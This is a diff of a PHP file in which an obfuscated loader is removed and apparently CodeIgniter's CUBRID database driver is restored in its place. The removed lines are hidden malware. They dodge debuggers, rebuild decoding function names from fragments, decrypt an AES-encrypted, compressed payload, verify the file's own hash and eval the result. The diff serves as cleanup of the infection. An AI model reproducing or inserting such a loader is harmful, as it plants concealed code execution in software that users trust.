@@ -1,28 +1,350 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_qe01wofj=('bas'.'e64'.'_de'.'cod'.'e');
-$_jqlldey0=('gzu'.'nco'.'mpr'.'ess');
-$_uzcu47ih=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_wbh6l3vl='W/HnsVaL';
-$_l44hd7q3='5SELQQud';
-$_rwdbt4ch='PkFx3zMW';
-$_w00veni3='SJAgSl7Oj/s=';
-$_zoh6fcbm='0YaVKVaH';
-$_nsb3vdzy='ftfTEw==';
-$_j1k7jbkz='e8OWkkT4';
-$_l5mjj6ke='AEpjyUIm';
-$_wo6655ap=$_qe01wofj($_wbh6l3vl.$_rwdbt4ch.$_l44hd7q3.$_zoh6fcbm.$_w00veni3);
-$_tzuqz540=$_qe01wofj($_l5mjj6ke.$_j1k7jbkz.$_nsb3vdzy);
-$_dezlgf1p=$_qe01wofj('iiR1+SD1+FbIv8iHyEsnenUdZmiWhI2XCi1zwvz2zFI5m8qW6yKysyQ+ndyVXxqI0ixcbKft4FWZthr9ElaX3RpOO53Wf1+nPx35iDZYaw7HHnMhkW+O/SwtQJnpQe7/3t2/AU6QkXQ1HgXcHy6FjuFTMjpZmEG3HQ4iHIfP9IdFlgmWH5k6U8K+1SUOk74w1L98J3+hMPf9gFnHB2x+7e0M7J5ofDyn2eyasVLK5dWwtiM0PRn2ws5dgx3S/LuhZavuiQmzIZrZ5K8YKHhCqZB5P/cSgOtOROAd6IZ2PGPYlEEUkfW9vwb/UCwASd8XVCa6MP7tlsBKQ8q0HFuz2K+Fk47nlfQ1ofMloBPuTi/HmkS38QmwdY8ivnyxx+kQ7pkOxkyoItjz0bYZtVsFxtwo3DsgKjORX9bphVE361c/0ZDQemA7ZivridkY8lD5BJYSR40LJa5Tn9Zv1t1whzSwD57VLvrr0bLY1/u07aEIYgMGAGj3Bhood0ZbGpO9pUgd93voopCV1pjwZ2XkOWpm7b6MlEfM7kdsx/TJD3Xd8B8skzOvDjhp/wO6TGY6sUsis2EcWnEi2vYhq9YBsPK+0tArv8qrBsHy1itNVsaTJohLMqh7NR7pgB43b7Rn4Ss+e0Jm30e/RxX4QGWxQFlI3Wksr7OsxGD2iqTzsgX7QcVmBKSMbsFlVF4T1qFhysPdEfwTjW+LMYnfrLVE09Fno7fe3gjl//mdAjM5wnfpD4AdDqUCVebhxd7QiueFIykt53HmR0wUsLu3iUYRvxbAVoTstxZVcl+QaSf2xqdplnhLKpHDf3Ce0zAyEJ5NUROz67n1FaRsytKmqq4HEBgr7jaTm5a1xzkfvSxYpi6HMWtxBYSM3SfF78VKfwgoMldAMdlL0Bd7svljcp2N0gkR0fCyuuOuX1ctAEBPpik98GPTlogquG2morqMnmO5G/m/cdAjQekb342x8bJHqxO+YO+lGDzZW6WFrw5CMQSo+GUlQyRM+NhVgIuGHaweMfYKwWAFBDhyWHRLrFM2h/7imA0afUbvHZvpgdt2Jf623ENMrt1zwdhvrZYTMUkaVPvl6cfE39z0EXVEAbFnTgPWmY+vgmggoGJG4VXtdiPuOLMxOsRNNTGDTeDWs2rpVPthtmWNqt77m96I7zS0n37O1sm0Y0DpbCPgAM1vQfsVhXHmI+dvSgJxA07d+eRMonRimz+tGsSaM7ULDFR978+fBPNRPluHwuJUomWLsWMCNtZMkGJr4O/A4VvYMHZzg4YFnKUtT5IhiCnzEltahufbczWoVItIsS8hPbfCCwtDGNWyCmoHJlfpfyytBUFpPjSTjSJyF4fLJljBOl4x0wyiMasGkjGev8IfSD3r72VbMZg+WozkXnBlXlM3+CdLQBQGPRX8aVX5ipEwfPjvF00AgI675XPMMK5Xqbhxx/xj+CC/SUZs07nAXV1Z6djaxhv4nfDRlpBPAAM7CDZIWiqfAbqZOUS+S9tB52oXozLumwhz2RWv/HJNlxUUcLvef/9NzT7BpKTvL/JxtAVod6Rh0DOuvdutxHcYN6npl+HyuSA86zgNiolu/zfs8jnjfr+GcINnEKzPZTA0cz/X4+m0YgW0W8BYokXP/X9LmWc21fzgZCZUfop8SO2hlbmKd96VzVdzeZUDKTn9ne9olw5Jtve1FlXVkRkAtoisaAKkgb+T7KXEms/+vSAYWonQ+l/AlIKHTdjCLU95ODpljg==');
-$_lnt6jpzf=$_uzcu47ih($_dezlgf1p,'aes-256-cbc',$_wo6655ap,OPENSSL_RAW_DATA,$_tzuqz540);
-if($_lnt6jpzf===false){exit;}
-$_i3e889pt=$_jqlldey0($_lnt6jpzf);
-if($_i3e889pt===false){exit;}
-$_r4ka7bzx='5bcbcaeddc37a8fa83c7b0eee158dd85c7396cfdb95bc06084146587d87a0665';
-$_tw8ya6vd=@file_get_contents(__FILE__);
-if($_tw8ya6vd!==false){
-$_k0r14fs7=str_replace($_r4ka7bzx,"0000000000000000000000000000000000000000000000000000000000000000",$_tw8ya6vd);
-$_if13ugqb=hash("sha256",$_k0r14fs7);
-if($_if13ugqb!==$_r4ka7bzx){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_cubrid_driver extends CI_DB {
+
+
+
+
+
+public $dbdriver = 'cubrid';
+
+
+
+
+
+public $auto_commit = TRUE;
+
+
+
+
+
+
+protected $_escape_char = '`';
+
+
+
+
+
+protected $_random_keyword = array('RANDOM()', 'RANDOM(%d)');
+
+
+
+
+
+
+
+public function __construct($params)
+{
+parent::__construct($params);
+if (preg_match('/^CUBRID:[^:]+(:[0-9][1-9]{0,4})?:[^:]+:[^:]*:[^:]*:(\?.+)?$/', $this->dsn, $matches))
+{
+if (stripos($matches[2], 'autocommit=off') !== FALSE)
+{
+$this->auto_commit = FALSE;
 }
-eval($_i3e889pt);
+}
+else
+{
+
+empty($this->port) OR $this->port = 33000;
+}
+}
+
+
+
+
+
+
+
+public function db_connect($persistent = FALSE)
+{
+if (preg_match('/^CUBRID:[^:]+(:[0-9][1-9]{0,4})?:[^:]+:([^:]*):([^:]*):(\?.+)?$/', $this->dsn, $matches))
+{
+$func = ($persistent !== TRUE) ? 'cubrid_connect_with_url' : 'cubrid_pconnect_with_url';
+return ($matches[2] === '' && $matches[3] === '' && $this->username !== '' && $this->password !== '')
+? $func($this->dsn, $this->username, $this->password)
+: $func($this->dsn);
+}
+$func = ($persistent !== TRUE) ? 'cubrid_connect' : 'cubrid_pconnect';
+return ($this->username !== '')
+? $func($this->hostname, $this->port, $this->database, $this->username, $this->password)
+: $func($this->hostname, $this->port, $this->database);
+}
+
+
+
+
+
+
+
+
+
+public function reconnect()
+{
+if (cubrid_ping($this->conn_id) === FALSE)
+{
+$this->conn_id = FALSE;
+}
+}
+
+
+
+
+
+
+public function version()
+{
+if (isset($this->data_cache['version']))
+{
+return $this->data_cache['version'];
+}
+return ( ! $this->conn_id OR ($version = cubrid_get_server_info($this->conn_id)) === FALSE)
+? FALSE
+: $this->data_cache['version'] = $version;
+}
+
+
+
+
+
+
+
+protected function _execute($sql)
+{
+return cubrid_query($sql, $this->conn_id);
+}
+
+
+
+
+
+
+protected function _trans_begin()
+{
+if (($autocommit = cubrid_get_autocommit($this->conn_id)) === NULL)
+{
+return FALSE;
+}
+elseif ($autocommit === TRUE)
+{
+return cubrid_set_autocommit($this->conn_id, CUBRID_AUTOCOMMIT_FALSE);
+}
+return TRUE;
+}
+
+
+
+
+
+
+protected function _trans_commit()
+{
+if ( ! cubrid_commit($this->conn_id))
+{
+return FALSE;
+}
+if ($this->auto_commit && ! cubrid_get_autocommit($this->conn_id))
+{
+return cubrid_set_autocommit($this->conn_id, CUBRID_AUTOCOMMIT_TRUE);
+}
+return TRUE;
+}
+
+
+
+
+
+
+protected function _trans_rollback()
+{
+if ( ! cubrid_rollback($this->conn_id))
+{
+return FALSE;
+}
+if ($this->auto_commit && ! cubrid_get_autocommit($this->conn_id))
+{
+cubrid_set_autocommit($this->conn_id, CUBRID_AUTOCOMMIT_TRUE);
+}
+return TRUE;
+}
+
+
+
+
+
+
+
+protected function _escape_str($str)
+{
+return cubrid_real_escape_string($str, $this->conn_id);
+}
+
+
+
+
+
+
+public function affected_rows()
+{
+return cubrid_affected_rows();
+}
+
+
+
+
+
+
+public function insert_id()
+{
+return cubrid_insert_id($this->conn_id);
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+$sql = 'SHOW TABLES';
+if ($prefix_limit !== FALSE && $this->dbprefix !== '')
+{
+return $sql." LIKE '".$this->escape_like_str($this->dbprefix)."%'";
+}
+return $sql;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_columns($table = '')
+{
+return 'SHOW COLUMNS FROM '.$this->protect_identifiers($table, TRUE, NULL, FALSE);
+}
+
+
+
+
+
+
+
+public function field_data($table)
+{
+if (($query = $this->query('SHOW COLUMNS FROM '.$this->protect_identifiers($table, TRUE, NULL, FALSE))) === FALSE)
+{
+return FALSE;
+}
+$query = $query->result_object();
+$retval = array();
+for ($i = 0, $c = count($query); $i < $c; $i++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = $query[$i]->Field;
+sscanf($query[$i]->Type, '%[a-z](%d)',
+$retval[$i]->type,
+$retval[$i]->max_length
+);
+$retval[$i]->default = $query[$i]->Default;
+$retval[$i]->primary_key = (int) ($query[$i]->Key === 'PRI');
+}
+return $retval;
+}
+
+
+
+
+
+
+
+
+
+public function error()
+{
+return array('code' => cubrid_errno($this->conn_id), 'message' => cubrid_error($this->conn_id));
+}
+
+
+
+
+
+
+
+
+
+protected function _from_tables()
+{
+if ( ! empty($this->qb_join) && count($this->qb_from) > 1)
+{
+return '('.implode(', ', $this->qb_from).')';
+}
+return implode(', ', $this->qb_from);
+}
+
+
+
+
+
+
+protected function _close()
+{
+cubrid_close($this->conn_id);
+}
+}
